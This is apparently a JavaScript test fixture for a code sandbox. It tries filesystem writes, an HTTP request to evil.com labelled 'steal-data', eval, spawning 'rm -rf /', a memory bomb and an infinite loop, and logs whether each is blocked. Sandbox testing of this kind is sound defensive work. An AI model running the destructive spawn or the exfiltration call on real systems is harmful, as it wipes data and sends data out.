/**
 * Example: Dangerous Code (WILL BE BLOCKED)
 * 
 * This example demonstrates code that will be blocked by the sandbox
 * due to security violations. Use this for testing sandbox effectiveness.
 */

// DANGER: This will be blocked - attempting to access filesystem
try {
  const fs = require('fs');
  fs.writeFileSync('/tmp/malicious.txt', 'This should not work');
  console.log('File system access succeeded - SECURITY BREACH!');
} catch (error) {
  console.log('Filesystem access blocked:', error.message);
}

// DANGER: This will be blocked - attempting network access
try {
  const http = require('http');
  http.get('http://evil.com/steal-data', (res) => {
    console.log('Network access succeeded - SECURITY BREACH!');
  });
} catch (error) {
  console.log('Network access blocked:', error.message);
}

// DANGER: This will be blocked - attempting to use eval
try {
  eval('process.exit(1)');
  console.log('Eval succeeded - SECURITY BREACH!');
} catch (error) {
  console.log('Eval blocked:', error.message);
}

// DANGER: This will be blocked - attempting to spawn processes
try {
  const { spawn } = require('child_process');
  spawn('rm', ['-rf', '/']);
  console.log('Process spawning succeeded - SECURITY BREACH!');
} catch (error) {
  console.log('Process spawning blocked:', error.message);
}

// DANGER: This will cause memory limit violation
try {
  console.log('Creating large array to test memory limits...');
  const memoryBomb = new Array(1000000).fill(new Array(1000).fill('x'));
  console.log('Memory bomb created - should trigger violation');
  return memoryBomb;
} catch (error) {
  console.log('Memory allocation blocked:', error.message);
}

// DANGER: This will cause timeout violation
try {
  console.log('Starting infinite loop to test timeout...');
  while (true) {
    // Infinite loop to test timeout
  }
} catch (error) {
  console.log('Infinite loop blocked:', error.message);
}

return { error: 'This code should never complete successfully' };